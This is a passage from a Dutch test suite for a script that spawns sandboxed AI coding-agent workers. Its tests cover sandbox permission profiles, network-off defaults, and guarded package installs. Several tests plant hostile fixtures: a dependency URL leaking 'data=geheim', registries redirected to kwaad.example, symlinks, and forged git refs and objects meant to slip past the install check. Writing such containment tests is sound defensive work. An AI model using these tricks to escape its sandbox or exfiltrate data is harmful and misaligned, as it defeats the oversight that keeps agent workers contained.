  test("bestaand project: geen project add; model zonder --model uit LAB_T3_MODEL, anders opus; provider uit LAB_T3_PROVIDER", () => {
    writeFileSync(join(dir, "t3-project"), "");
    expect(t3(["--map", wt]).code).toBe(0);
    expect(log("t3.log")).not.toContain("project add");
    expect(log("t3.log")).toContain("--provider claudeAgent --model claude-opus-5-5 ");
    expect(t3(["--map", wt], { LAB_T3_MODEL: "claude-fable-5-1", LAB_T3_PROVIDER: "claude-2" }).code).toBe(0);
    expect(log("t3.log")).toContain("--provider claude-2 --model claude-fable-5-1 ");
  });

  test("faalt luid als de thread niet start, niet aan het werk gaat of mislukt", () => {
    writeFileSync(join(dir, "t3-startfout"), "");
    expect(t3(["--map", wt]).fout).toMatch(/thread starten mislukte: server niet bereikbaar/);
    rmSync(join(dir, "t3-startfout"));
    show({ itemCount: 2 }); // startzin + hook, nog geen werk
    const stil = t3(["--map", wt]);
    expect(stil.code).toBe(1);
    expect(stil.fout).toMatch(/toonde geen werk binnen 0s/);
    show({ status: "failed", itemCount: 1 });
    expect(t3(["--map", wt]).fout).toMatch(/staat op 'failed'/);
  });

  test("leest het thread-id met en zonder 'Thread '-voorvoegsel en weigert onzin", () => {
    expect(t3(["--map", wt]).uit.trim()).toBe("t3:mcp:1234abcd-0000");
    writeFileSync(join(dir, "t3-tty"), "");
    expect(t3(["--map", wt]).uit.trim()).toBe("t3:mcp:1234abcd-0000");
    writeFileSync(join(dir, "t3-onzin"), "");
    const r = t3(["--map", wt]);
    expect(r.code).toBe(1);
    expect(r.fout).toMatch(/geen thread-id in de uitvoer/);
  });

  test("meldt een open vraag in de thread: dan geen thread send", () => {
    show({ pendingRequestCount: 1 });
    const r = t3(["--map", wt]);
    expect(r.code).toBe(0);
    expect(r.fout).toMatch(/pendingRequestCount > 0/);
  });

  test("--droog toont de stappen en schrijft en start niets; --meerdere geeft --t3 door", () => {
    const r = t3(["--map", wt, "--droog"]);
    expect(r.code).toBe(0);
    expect(r.uit).toContain(`in ${inst()}`);
    expect(r.uit).toContain("thread start --title w1 --provider claudeAgent --model claude-opus-5-5");
    expect(existsSync(inst())).toBe(false);
    expect(log("t3.log")).toBe("");
    const lijst = join(dir, "lijst.txt");
    writeFileSync(lijst, `a ${opdracht()}\nb ${opdracht()}\n`);
    const m = draai(SPAWN, ["--meerdere", lijst, "--lead", "l", "--map", wt, "--t3", "--droog"], basis());
    expect(m.code).toBe(0);
    expect(m.uit).toContain("spawn: a gestart: droog: controleer met thread show");
    expect(m.uit).toContain("spawn: b gestart: droog: controleer met thread show");
  });
});

describe("spawn.sh --vendor codex", () => {
  let wt: string;
  let staat: string;
  const opdracht = () => {
    const p = join(dir, "opdracht.md");
    writeFileSync(p, "doe iets\n");
    return p;
  };
  let codexHome: string;
  /** Een Codex-config zoals codex-installeer.ts hem achterlaat: hooks-blok + trust-tabel(len) in hooks.state. */
  const schrijfConfig = (o: { grenzen?: boolean; vertrouwd?: boolean; matcher?: string; kopieAf?: boolean; bovenaan?: string } = {}) => {
    const { grenzen = true, vertrouwd = true, matcher = "Bash|apply_patch", kopieAf = false, bovenaan = "" } = o;
    mkdirSync(codexHome, { recursive: true });
    const cfg = join(codexHome, "config.toml");
    // de geïnstalleerde bestanden zoals codex-installeer.ts ze neerzet (gelijk aan de repo, uitvoerbaar)
    const doel = join(codexHome, "hooks", "lab-lead-hooks");
    mkdirSync(doel, { recursive: true });
    for (const b of [...GELIJK_AAN_REPO, "hook.sh"]) {
      writeFileSync(join(doel, b), readFileSync(join(import.meta.dir, "hooks", b)), { mode: b.endsWith(".sh") ? 0o755 : 0o644 });
    }
    if (kopieAf) appendFileSync(join(doel, "grenzen.sh"), "\n# oud\n");
    const groep = (m: string, cmd: string) => `[[hooks.PreToolUse]]\nmatcher = ${JSON.stringify(m)}\n[[hooks.PreToolUse.hooks]]\ntype = "command"\ncommand = ${JSON.stringify(cmd)}\ntimeout = 5\n`;
    let t = bovenaan ? `${bovenaan}\n` : "";
    t += groep(".*", commando(doel, process.execPath));
    if (grenzen) t += `\n${groep(matcher, commando(doel, process.execPath, "grenzen.sh"))}`;
    writeFileSync(cfg, t);
    if (vertrouwd) appendFileSync(cfg, `\n[hooks.state."${realpathSync(cfg)}:pre_tool_use:1:0"]\ntrusted_hash = "sha256:${"ab".repeat(32)}"\n`);
  };
  // De tmp-wortel van de werker-tmp-mappen (lab-werker-<naam>) in de testmap, zodat een niet-droge spawn niets in /tmp achterlaat.
  const werkWortel = () => {
    mkdirSync(join(dir, "werker-tmp"), { recursive: true });
    return join(dir, "werker-tmp");
  };
  const basis = (extra: Record<string, string> = {}) => ({
    LAB_WERKER_TMPWORTEL: werkWortel(),
    CODEX_HOME: codexHome,
    LAB_SPAWN_SCRIPT: join(bin, "nep-agent-spawn.sh"),
    LAB_SPAWN_POLS: "0",
    LAB_SPAWN_WACHT: "0",
    LAB_SPAWN_BEWIJS: "0",
    LAB_SPAWN_ENTER: "0",
    LAB_LEAD_NAAM: "",
    LAB_CLAUDE_JSON: join(dir, "bestaat-niet.json"),
    LAB_T3: join(bin, "t3"),
    LAB_T3_MODEL: "",
    LAB_LEAD_STAAT: staat,
    ...extra,
  });
  // Een T3-codex-thread weigert zonder --zonder-sandbox; de meeste tests gaan daar niet over, dus zet de helper hem erbij (`geenSandboxVlag`: niet).
  const codex = (args: string[], extra: Record<string, string> = {}, naam = "cx1", geenSandboxVlag = false) =>
    draai(SPAWN, ["--naam", naam, "--opdracht", opdracht(), "--lead", "lead-x", "--vendor", "codex", ...(args.includes("--t3") && !geenSandboxVlag ? ["--zonder-sandbox"] : []), ...args], basis(extra));
  const idDir = () => join(staat, "identiteit");
  const idBestanden = () => (existsSync(idDir()) ? readdirSync(idDir()) : []);

  beforeEach(() => {
    staat = join(dir, "staat");
    codexHome = join(dir, "codex-home");
    schrijfConfig();
    wt = join(dir, "eigen-worktree");
    git(repo, "worktree", "add", "-q", "-b", "werk", wt);
    schrijfBin(
      "t3",
      `#!/usr/bin/env bash
echo "t3 [$PWD] $*" >> "$FAKE_DIR/t3.log"
case "$1 $2" in
  "thread list") exit 0 ;;
  "thread start") cat > "$FAKE_DIR/t3-stdin.txt"; echo "mcp:1234abcd-0000"; exit 0 ;;
  "thread show") echo '{"thread":{"status":"running","itemCount":3,"pendingRequestCount":0},"messages":[]}'; exit 0 ;;
esac
exit 1
`,
    );
  });

  test("gereserveerde namen codex-<12 hex> (ook hoofdletters) worden geweigerd, ook in --meerdere; andere codex-namen mogen", () => {
    for (const naam of ["codex-0123456789ab", "CODEX-ABCDEF012345", "Codex-aBcDeF012345"]) {
      const r = codex(["--map", wt, "--droog"], {}, naam);
      expect(r.code).toBe(1);
      expect(r.fout).toMatch(/gereserveerd/);
      const lijst = join(dir, "res.txt");
      writeFileSync(lijst, `${naam} ${opdracht()}\n`);
      const m = draai(SPAWN, ["--meerdere", lijst, "--lead", "l", "--map", wt, "--vendor", "codex", "--droog"], basis());
      expect(m.code).toBe(1);
      expect(m.fout).toMatch(/gereserveerd/);
    }
    for (const naam of ["codex-0123456789a", "codex-0123456789abc", "codex-0123456789ag", "mijn-codex-0123456789ab"]) {
      expect(codex(["--map", wt, "--droog"], {}, naam).fout).not.toMatch(/gereserveerd/);
    }
    expect(idBestanden()).toEqual([]);
  });

  test("een ongeldige --vendor, een sublead en een model met shell-tekens worden geweigerd", () => {
    expect(draai(SPAWN, ["--naam", "w", "--opdracht", opdracht(), "--lead", "l", "--vendor", "gpt", "--droog"], basis()).fout).toMatch(/claude of codex/);
    expect(codex(["--sublead", "--droog"]).fout).toMatch(/--sublead vraagt Claude/);
    expect(codex(["--model", "a;b", "--droog"]).fout).toMatch(/mag alleen letters/);
    expect(codex(["--map", wt, "--model", "opus", "--droog"]).code).toBe(0); // een Codex-model is vrij, niet sonnet/opus
  });

  test("tmux: de opdrachtregel start codex met LAB_AGENT_ROL altijd in de omgeving en -C <map>", () => {
    const r = codex(["--map", wt, "--model", "gpt-6-luna", "--droog"]);
    expect(r.code).toBe(0);
    expect(r.uit).toMatch(/env LAB_AGENT_NAAM=cx1 LAB_AGENT_ROL=agent LAB_LEAD_NAAM=lead-x /);
    expect(r.uit).toContain(`LAB_LEAD_STAAT=${staat} CODEX_HOME=${codexHome} codex -C ${wt} -m gpt-6-luna`); // d) de pane krijgt de gecontroleerde CODEX_HOME mee
    expect(r.uit).not.toContain("claude -n");
    expect(r.uit).toContain("met de tool send van MCP-server peers (naar: lead-x)");
    expect(r.uit).not.toContain("SendMessage");
    expect(r.uit).toContain("schrijf de identiteit (naam=cx1 rol=agent)");
    expect(idBestanden()).toEqual([]); // droog schrijft niets
    expect(log("spawn.log")).toBe("");
  });

  test("tmux: de peers-MCP gaat per spawn mee als -c met een statische env-tabel, nooit als env_vars", () => {
    const server = join(dir, "server.ts");
    writeFileSync(server, "// nep\n");
    const r = codex(["--map", wt, "--droog"], { LAB_PEERS_SERVER: server });
    expect(r.uit).toContain(`-c 'mcp_servers.peers.args=["${server}"]'`);
    expect(r.uit).toContain(`-c 'mcp_servers.peers.env={LAB_AGENT_NAAM="cx1",LAB_LEAD_NAAM="lead-x",LAB_LEAD_STAAT="${staat}"}'`);
    expect(r.uit).not.toContain("env_vars");
    expect(r.uit).not.toContain("--mcp-config"); // de Claude-vorm nooit voor Codex
    const zonder = codex(["--map", wt, "--droog"], { LAB_PEERS_SERVER: join(dir, "bestaat-niet.ts") });
    expect(zonder.fout).toMatch(/peers-MCP .* ontbreekt/);
    expect(zonder.uit).not.toContain("mcp_servers.peers");
  });

  test("sandbox: tmux start de werker met een permissieprofiel (netwerk uit, -a never); de gedeelde .git is niet als geheel schrijfbaar", () => {
    writeFileSync(join(dir, "pane.txt"), "Ask Codex\n• Ran ls\n");
    const r = codex(["--map", wt, "--droog"], { TMPDIR: join(dir, "sbtmp") });
    const gem = realpathSync(join(repo, ".git"));
    const eigen = realpathSync(join(gem, "worktrees", "eigen-worktree"));
    expect(r.uit).toContain(" -a never ");
    expect(r.uit).toContain(`-c 'default_permissions="lab-werker"'`);
    expect(r.uit).toContain(`-c 'permissions.lab-werker.network={enabled=false}'`);
    expect(r.uit).not.toContain("enabled=true");
    const fs = /-c 'permissions\.lab-werker\.filesystem=\{([^']*)\}'/.exec(r.uit)?.[1] ?? "";
    const regels = fs.split(",").map((x) => x.replace(/"/g, ""));
    const heeft = (pad: string, toegang: string) => regels.includes(`${pad}=${toegang}`);
    for (const d of ["objects", "refs", "logs"]) expect(heeft(`${gem}/${d}`, "write")).toBe(true);
    expect(heeft(eigen, "write")).toBe(true);
    for (const f of ["commondir", "gitdir", "config.worktree"]) expect(heeft(`${eigen}/${f}`, "read")).toBe(true);
    expect(heeft(realpathSync(wt), "write")).toBe(true);
    // nooit de hele common .git, hooks of config als schrijfbaar
    for (const pad of [gem, `${gem}/hooks`, `${gem}/config`, `${gem}/info`, `${gem}/worktrees`]) expect(regels.some((x) => x === `${pad}=write`)).toBe(false);
    // sleutelmappen onleesbaar
    expect(regels.some((x) => x.endsWith("/.config/klaarover=none"))).toBe(true);
    // ~/.codex als geheel dicht, met een paar leesmappen erin weer open (een diepere regel wint)
    expect(regels.some((x) => x.endsWith("/.codex=none"))).toBe(true);
    expect(regels.some((x) => x.endsWith("/.codex/skills=read"))).toBe(true);
    // de standalone codex-binary staat in ~/.codex/packages; dicht laat de sandboxhelper van Codex hem niet starten (echte demo, 27 okt)
    expect(regels.some((x) => x.endsWith("/.codex/packages=read"))).toBe(true);
    expect(regels.some((x) => x.endsWith("/.codex/sessions=none") || x.endsWith("/.codex/auth.json=none"))).toBe(false);
  });

  test("sandbox: een pad met een quote of backslash weigert spawn (nooit een halve sandbox)", () => {
    const slecht = join(dir, "slecht'pad");
    mkdirSync(slecht);
    const r = draai(SPAWN, ["--naam", "cx1", "--opdracht", opdracht(), "--lead", "lead-x", "--vendor", "codex", "--map", wt, "--droog"], basis({ HOME: slecht }));
    expect(r.code).toBe(1);
    expect(r.fout).toMatch(/kan niet in de sandbox-config/);
  });

  test("sandbox: --t3 met --vendor codex weigert zonder --zonder-sandbox, ook met --droog; met de vlag start hij", () => {
    for (const extra of [["--t3"], ["--t3", "--droog"]]) {
      const r = codex(["--map", wt, ...extra], {}, "cx1", true);
      expect(r.code).toBe(1);
      expect(r.fout).toMatch(/weigert.*--zonder-sandbox/);
      expect(r.fout).toMatch(/alleen op aanwijzing van Brian/);
    }
    expect(idBestanden()).toEqual([]);
    expect(log("t3.log")).toBe("");
    expect(codex(["--map", wt, "--t3", "--droog"]).code).toBe(0); // de helper zet --zonder-sandbox erbij
  });

  // Echte afdwinging: het profiel uit spawn.sh in een echte Codex (seatbelt), met een nep-Responses-server die één shellcommando
  // laat draaien. Alleen macOS met een codex-binary; elders draait dit niet (de pure test hierboven bewaakt dan de vorm).
  test("sandbox (echte codex): schrijven naar .git/hooks, .git/config en commondir faalt met EPERM, een commit in de worktree slaagt", async () => {
    const codexBin = Bun.which("codex");
    if (process.platform !== "darwin" || !codexBin) {
      console.log("sandbox-afdwinging niet getoetst: geen macOS of geen codex");
      return;
    }
    writeFileSync(join(dir, "pane.txt"), "Ask Codex\n• Ran ls\n");
    // Een eigen HOME in de tijdelijke map (nooit het echte HOME aanraken): de sandbox mag er niets in schrijven, ook niet in een bestaand dotfile.
    const thuis = join(dir, "thuis");
    mkdirSync(thuis);
    writeFileSync(join(thuis, ".zshrc"), "# kopie\n");
    const r = codex(["--map", wt, "--droog"], { TMPDIR: join(dir, "sbtmp"), HOME: thuis });
    const cArgs = [...r.uit.matchAll(/-c '((?:default_permissions|permissions\.)[^']*)'/g)].map((m) => m[1]);
    expect(cArgs.length).toBe(3);
    const gem = realpathSync(join(repo, ".git"));
    const eigen = realpathSync(join(gem, "worktrees", "eigen-worktree"));
    git(repo, "config", "user.email", "t@t");
    git(repo, "config", "user.name", "t");
    const shell = [
      "echo b > b.txt; git add b.txt && git commit -qm sandbox-test && echo COMMIT-OK",
      `touch ${gem}/hooks/x && echo HOOK-OK`,
      `echo x >> ${gem}/config && echo CONFIG-OK`,
      `echo x > ${eigen}/commondir && echo COMMONDIR-OK`,
      `echo x > ${eigen}/gitdir && echo GITDIR-OK`,
      `echo x > ${eigen}/config.worktree && echo CFGWT-OK`,
      `echo x > ${join(dir, "buiten.txt")} && echo BUITEN-OK`,
      `echo x >> ${thuis}/.zshrc && echo ZSHRC-OK`,
      `touch ${thuis}/nieuw && echo THUISNIEUW-OK`,
      `echo x > ${gem}/packed-refs && echo PACKED-OK`,
      `touch ${gem}/info/x && echo INFO-OK`,
      `echo x > ${gem}/HEAD && echo HEAD-OK`,
    ].join("; ");
    let verzoeken = 0;
    let uitvoer = "";
    const server = Bun.serve({
      port: 0,
      hostname: "127.0.0.1",
      async fetch(req) {
        const body = await req.text();
        if (!new URL(req.url).pathname.endsWith("/responses")) return new Response("{}", { status: 404 });
        verzoeken++;
        const sse = (e: string, d: object) => `event: ${e}\ndata: ${JSON.stringify({ type: e, ...d })}\n\n`;
        let uit = sse("response.created", { response: { id: `r${verzoeken}`, status: "in_progress" } });
        const item =
          verzoeken === 1
            ? { type: "function_call", id: "fc_1", call_id: "call_1", name: "exec_command", arguments: JSON.stringify({ cmd: shell }) }
            : { type: "message", id: "m_2", role: "assistant", content: [{ type: "output_text", text: "klaar" }] };
        if (verzoeken === 2) {
          const o = (JSON.parse(body).input as { type?: string; output?: unknown }[]).find((i) => i.type === "function_call_output");
          uitvoer = String(o?.output ?? "");
        }
        uit += sse("response.output_item.added", { output_index: 0, item: verzoeken === 1 ? item : { ...item, content: [] } }) + sse("response.output_item.done", { output_index: 0, item });
        uit += sse("response.completed", { response: { id: `r${verzoeken}`, status: "completed", usage: { input_tokens: 1, output_tokens: 1, total_tokens: 2 } } });
        return new Response(uit, { headers: { "content-type": "text/event-stream" } });
      },
    });
    try {
      const ch = join(dir, "codex-sandbox-home");
      mkdirSync(ch, { recursive: true });
      writeFileSync(join(ch, "config.toml"), `model = "nep"\nmodel_provider = "nep"\n[model_providers.nep]\nname = "nep"\nbase_url = "http://127.0.0.1:${server.port}/v1"\nwire_api = "responses"\nrequires_openai_auth = false\n`);
      const p = Bun.spawn([codexBin, "exec", "--skip-git-repo-check", ...cArgs.flatMap((c) => ["-c", c]), "doe"], { cwd: wt, env: { PATH: process.env.PATH ?? "", HOME: thuis, CODEX_HOME: ch }, stdin: "ignore", stdout: "pipe", stderr: "pipe" });
      const timer = setTimeout(() => p.kill(), 90_000); // echte-klok: een echte codex-run, geen testklok
      await p.exited;
      clearTimeout(timer);
    } finally {
      server.stop(true);
    }
    expect(uitvoer).toContain("COMMIT-OK");
    for (const x of ["HOOK-OK", "CONFIG-OK", "COMMONDIR-OK", "GITDIR-OK", "CFGWT-OK", "BUITEN-OK", "ZSHRC-OK", "THUISNIEUW-OK", "PACKED-OK", "INFO-OK", "HEAD-OK"]) expect(uitvoer).not.toContain(x);
    expect((uitvoer.match(/[Oo]peration not permitted/g) ?? []).length).toBeGreaterThanOrEqual(11);
    expect(readFileSync(join(thuis, ".zshrc"), "utf8")).toBe("# kopie\n");
    expect(existsSync(join(thuis, "nieuw"))).toBe(false);
    expect(git(wt, "log", "--format=%s", "-1").stdout.toString().trim()).toBe("sandbox-test");
    expect(existsSync(join(gem, "hooks", "x"))).toBe(false);
  }, 120_000);

  /** Een nep-bun: `install` wordt gelogd (argumenten, cwd, aantal identiteitsbestanden op dat moment); al het andere gaat naar de echte bun. */
  const nepBun = (faal = false) => {
    const pad = join(bin, "nep-bun");
    writeFileSync(
      pad,
      [
        "#!/usr/bin/env bash",
        `if [ "$1" = install ]; then echo "install $* | $PWD | ids=$(ls "${idDir()}" 2>/dev/null | wc -l | tr -d ' ')" >> "${join(dir, "install.log")}"; ${faal ? "exit 1" : "exit 0"}; fi`,
        `exec "${process.execPath}" "$@"`,
        "",
      ].join("\n"),
      { mode: 0o755 },
    );
    return pad;
  };
  /** Zet een bestand op origin/main (de vertrouwde kant: spawn leest het met ls-remote) én, gelijk, in de worktree van de werker. */
  const vertrouwd = (bestand: string, inhoud: string) => {
    git(repo, "checkout", "-q", "main");
    mkdirSync(dirname(join(repo, bestand)), { recursive: true });
    writeFileSync(join(repo, bestand), inhoud);
    git(repo, "add", bestand);
    git(repo, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "-m", `vertrouwd ${bestand}`);
    git(repo, "push", "-q", "origin", "main");
    mkdirSync(dirname(join(wt, bestand)), { recursive: true });
    writeFileSync(join(wt, bestand), inhoud);
  };
  const installLog = () => (existsSync(join(dir, "install.log")) ? readFileSync(join(dir, "install.log"), "utf8") : "");

  test("netwerk uit is de standaard: --netwerk zet het aan; de startzin zegt niet pushen en meldt 'klaar om te pushen'; geen install-regel zonder package.json", () => {
    writeFileSync(join(dir, "pane.txt"), "Ask Codex\n• Ran ls\n");
    const uit = codex(["--map", wt, "--droog"]);
    expect(uit.uit).toContain("network={enabled=false}");
    expect(uit.uit).toContain("push niet en draai geen gh");
    expect(uit.uit).toContain("klaar om te pushen op <sha>");
    expect(uit.uit).toContain("scripts/lead/push-werker.sh, nooit met een push vanuit jouw worktree");
    expect(uit.uit).not.toContain("droog: bun install"); // K5: geen package.json
    writeFileSync(join(wt, "package.json"), "{}\n");
    expect(codex(["--map", wt, "--droog"]).uit).toContain(`droog: bun install --ignore-scripts --frozen-lockfile in ${wt}`);
    const aan = codex(["--map", wt, "--droog", "--netwerk"]);
    expect(aan.uit).toContain("network={enabled=true}");
    expect(aan.uit).not.toContain("push niet en draai geen gh");
    expect(aan.uit).not.toContain("droog: bun install");
    // K2: --t3 --netwerk weigert
    const t3 = codex(["--map", wt, "--t3", "--netwerk", "--droog"]);
    expect(t3.code).toBe(1);
    expect(t3.fout).toMatch(/--netwerk past niet bij --t3/);
    expect(codex(["--map", wt, "--t3", "--droog"]).uit).not.toContain("push niet en draai geen gh");
    // --netwerk hoort bij codex
    const cl = draai(SPAWN, ["--naam", "w", "--opdracht", opdracht(), "--lead", "l", "--netwerk", "--droog"], basis());
    expect(cl.code).toBe(1);
    expect(cl.fout).toMatch(/--netwerk hoort bij --vendor codex/);
    // de helptekst toont de hele kop (tot de laatste commentaarregel)
    const h = draai(SPAWN, ["--help"], basis());
    expect(h.uit).toContain("Zie scripts/lead/README.md.");
    expect(h.uit).toContain("--netwerk");
  });

  test("--meerdere: --netwerk gaat door naar elke sessie; zonder netwerk weigert codex met meer dan één sessie (parallelle install in één worktree)", () => {
    writeFileSync(join(dir, "pane.txt"), "Ask Codex\n• Ran ls\n");
    const lijst = join(dir, "lijst.txt");
    writeFileSync(lijst, `a ${opdracht()}\nb ${opdracht()}\n`);
    const aan = draai(SPAWN, ["--meerdere", lijst, "--lead", "l", "--map", wt, "--vendor", "codex", "--netwerk"], basis());
    expect(aan.fout).not.toMatch(/parallel in één worktree/);
    expect(log("spawn.log")).toContain("network={enabled=true}"); // de kindsessie kreeg --netwerk
    expect(log("spawn.log")).not.toContain("enabled=false");
    rmSync(idDir(), { recursive: true, force: true });
    const uit = draai(SPAWN, ["--meerdere", lijst, "--lead", "l", "--map", wt, "--vendor", "codex"], basis());
    expect(uit.code).toBe(1);
    expect(uit.fout).toMatch(/parallel in één worktree/);
    expect(idBestanden()).toEqual([]);
  });

  test("M1: bun install draait met --ignore-scripts --frozen-lockfile, vóór de identiteit, alleen met package.json en zonder --netwerk; mislukt = niets gestart", () => {
    writeFileSync(join(dir, "pane.txt"), "Ask Codex\n• Ran ls\n");
    const bun = nepBun();
    const env = { LAB_LEAD_BUN: bun };
    codex(["--map", wt], env);
    expect(installLog()).toBe(""); // geen package.json
    vertrouwd("package.json", "{}\n");
    codex(["--map", wt, "--netwerk"], env);
    expect(installLog()).toBe(""); // met netwerk installeert de werker zelf
    rmSync(idDir(), { recursive: true, force: true });
    codex(["--map", wt], env);
    expect(installLog()).toMatch(/^install install --ignore-scripts --frozen-lockfile \| \S*eigen-worktree \| ids=0\n$/); // nog geen identiteit
    expect(idBestanden().length).toBe(1);
    // een lopende andere sessie in deze checkout: geweigerd vóór de install
    const voor = installLog();
    const r2 = codex(["--map", wt], env, "cx2");
    expect(r2.code).toBe(1);
    expect(r2.fout).toMatch(/draagt al de identiteit/);
    expect(installLog()).toBe(voor);
    // mislukte install: foutmelding, geen identiteit
    rmSync(idDir(), { recursive: true, force: true });
    const r = codex(["--map", wt], { LAB_LEAD_BUN: nepBun(true) });
    expect(r.code).toBe(1);
    expect(r.fout).toMatch(/bun install --ignore-scripts --frozen-lockfile in .* mislukte/);
    expect(idBestanden()).toEqual([]);
  });

  test("MOET-2: bun install alleen als bun.lock, elke package.json, bunfig.toml en .npmrc gelijk zijn aan origin/main (ls-remote-sha, niet te vervalsen via refs/)", () => {
    writeFileSync(join(dir, "pane.txt"), "Ask Codex\n• Ran ls\n");
    vertrouwd("package.json", "{}\n");
    vertrouwd("packages/a/package.json", "{}\n");
    vertrouwd("bun.lock", "{}\n");
    const env = { LAB_LEAD_BUN: nepBun() };
    const weiger = (patroon: RegExp) => {
      const r = codex(["--map", wt], env);
      expect(r.code).toBe(1);
      expect(r.fout).toMatch(patroon);
      expect(installLog()).toBe("");
      expect(idBestanden()).toEqual([]);
    };
    // een nieuw .npmrc of bunfig.toml
    writeFileSync(join(wt, ".npmrc"), "registry=http://kwaad.example/\n");
    weiger(/\.npmrc in .* wijkt af van origin\/main/);
    rmSync(join(wt, ".npmrc"));
    writeFileSync(join(wt, "bunfig.toml"), "[install]\n");
    weiger(/bunfig\.toml in .* wijkt af/);
    rmSync(join(wt, "bunfig.toml"));
    // een afhankelijkheid die een GET buiten de sandbox doet, in de root, in een workspace, en in bun.lock
    writeFileSync(join(wt, "package.json"), JSON.stringify({ dependencies: { x: "http://127.0.0.1:9/x.tgz?data=geheim" } }));
    weiger(/package\.json in .* wijkt af/);
    // de werker vervalst refs/remotes/origin/main met de eigen versie: de toets leest origin zelf, dus nog steeds geweigerd
    git(wt, "add", "-f", "package.json");
    git(wt, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "-m", "kwaad");
    git(wt, "update-ref", "refs/remotes/origin/main", "HEAD");
    weiger(/package\.json in .* wijkt af/);
    writeFileSync(join(wt, "package.json"), "{}\n");
    writeFileSync(join(wt, "packages/a/package.json"), JSON.stringify({ dependencies: { y: "file:../../geheim" } }));
    weiger(/packages\/a\/package\.json in .* wijkt af/);
    writeFileSync(join(wt, "packages/a/package.json"), "{}\n");
    writeFileSync(join(wt, "bun.lock"), "{\"kwaad\": 1}\n");
    weiger(/bun\.lock in .* wijkt af/);
    // een symlink in plaats van het bestand (zelfde inhoud)
    rmSync(join(wt, "bun.lock"));
    writeFileSync(join(dir, "doel"), "{}\n");
    symlinkSync(join(dir, "doel"), join(wt, "bun.lock"));
    weiger(/bun\.lock in .* wijkt af/);
    // .env* (bun leest .env bij install: BUN_CONFIG_REGISTRY) en een symlink naar een map met een eigen package.json
    rmSync(join(wt, "bun.lock"));
    writeFileSync(join(wt, "bun.lock"), "{}\n");
    writeFileSync(join(wt, ".env"), "BUN_CONFIG_REGISTRY=http://kwaad.example/\n");
    weiger(/\.env in .* wijkt af/);
    rmSync(join(wt, ".env"));
    mkdirSync(join(dir, "vreemd"));
    writeFileSync(join(dir, "vreemd", "package.json"), JSON.stringify({ dependencies: { z: "file:../x" } }));
    symlinkSync(join(dir, "vreemd"), join(wt, "koppeling"));
    weiger(/koppeling in .* wijkt af/);
    rmSync(join(wt, "koppeling"));
    // een node_modules die een symlink is (root of in een workspace): bun install zou erdoorheen schrijven; find slaat hem over
    mkdirSync(join(dir, "buiten"));
    symlinkSync(join(dir, "buiten"), join(wt, "node_modules"));
    weiger(/node_modules in .* is een symlink/);
    rmSync(join(wt, "node_modules"));
    symlinkSync(join(dir, "buiten"), join(wt, "packages/a/node_modules"));
    weiger(/packages\/a\/node_modules in .* is een symlink/);
    rmSync(join(wt, "packages/a/node_modules"));
    // een bestand in node_modules telt niet
    rmSync(join(wt, "bun.lock"));
    writeFileSync(join(wt, "bun.lock"), "{}\n");
    mkdirSync(join(wt, "node_modules/p"), { recursive: true });
    writeFileSync(join(wt, "node_modules/p/package.json"), "{\"x\":1}");
    expect(codex(["--map", wt], env).code).toBe(0);
    expect(installLog()).toContain("install install");
  }, 60_000); // spawn.sh draait hier meerdere keren; 5 s is te krap onder belasting

  test("MOET-A: een vervalst los object in de gedeelde objects/ (onder de sha van de vertrouwde package.json) misleidt de vergelijking niet", () => {
    writeFileSync(join(dir, "pane.txt"), "Ask Codex\n• Ran ls\n");
    vertrouwd("package.json", "{}\n");
    const kwaad = JSON.stringify({ dependencies: { x: "http://127.0.0.1:9/x.tgz?data=geheim" } }) + "\n";
    const blob = git(repo, "rev-parse", "HEAD:package.json").stdout.toString().trim();
    const gemeen = realpathSync(git(wt, "rev-parse", "--path-format=absolute", "--git-common-dir").stdout.toString().trim());
    const los = join(gemeen, "objects", blob.slice(0, 2), blob.slice(2));
    expect(existsSync(los)).toBe(true);
    chmodSync(los, 0o644);
    writeFileSync(los, deflateSync(Buffer.from(`blob ${Buffer.byteLength(kwaad)}\0${kwaad}`)));
    // de aanval werkt tegen de gedeelde .git: git leest daar nu de inhoud van de werker onder de sha van main
    expect(git(repo, "show", `${blob}`).stdout.toString()).toBe(kwaad);
    writeFileSync(join(wt, "package.json"), kwaad);
    const r = codex(["--map", wt], { LAB_LEAD_BUN: nepBun() });
    expect(r.code).toBe(1);
    expect(r.fout).toMatch(/package\.json in .* wijkt af/);
    expect(installLog()).toBe("");
    expect(idBestanden()).toEqual([]);
  }, 60_000);

  test("MOET-2: kan origin/main niet bepaald worden, dan geen install buiten de sandbox", () => {
    writeFileSync(join(dir, "pane.txt"), "Ask Codex\n• Ran ls\n");
    vertrouwd("package.json", "{}\n");
    git(repo, "remote", "set-url", "origin", join(dir, "bestaat-niet.git"));
    const r = codex(["--map", wt], { LAB_LEAD_BUN: nepBun() });
    expect(r.code).toBe(1);
    expect(r.fout).toMatch(/kon origin\/main niet ophalen.*--netwerk/);
    expect(installLog()).toBe("");
  }, 60_000); // spawn.sh draait hier meerdere keren; 5 s is te krap onder belasting

  test("M1 (echte bun): een postinstall in de worktree draait niet; zonder --ignore-scripts zou hij wel draaien", () => {
    writeFileSync(join(dir, "pane.txt"), "Ask Codex\n• Ran ls\n");
    const marker = join(dir, "postinstall-draaide");
    const pkg = JSON.stringify({ name: "x", version: "1.0.0", scripts: { postinstall: `touch ${marker}` } });
    vertrouwd("package.json", pkg);
    const schoon = { PATH: process.env.PATH ?? "", HOME: process.env.HOME ?? "" };
    // een lockfile maken zonder scripts, en de controle dat scripts zonder de vlag wel draaien (in een kopie)
    expect(Bun.spawnSync([process.execPath, "install", "--ignore-scripts"], { cwd: wt, env: schoon }).exitCode).toBe(0);
    expect(existsSync(marker)).toBe(false);
    if (existsSync(join(wt, "bun.lock"))) vertrouwd("bun.lock", readFileSync(join(wt, "bun.lock"), "utf8")); // zonder afhankelijkheden schrijft bun er geen
    const kopie = join(dir, "kopie");
    mkdirSync(kopie);
    writeFileSync(join(kopie, "package.json"), pkg);
    expect(Bun.spawnSync([process.execPath, "install"], { cwd: kopie, env: schoon }).exitCode).toBe(0);
    expect(existsSync(marker)).toBe(true);
    rmSync(marker);
    git(wt, "add", "-A");
    codex(["--map", wt], { LAB_LEAD_BUN: process.execPath });
    expect(idBestanden().length).toBe(1); // spawn kwam voorbij de install
    expect(existsSync(marker)).toBe(false);
  });

  test("ZOU-1: de identiteit legt de tak van de worktree bij de start vast (voor push-werker.sh); een losse HEAD legt er geen vast", () => {
    writeFileSync(join(dir, "pane.txt"), "Ask Codex\n• Ran ls\n");
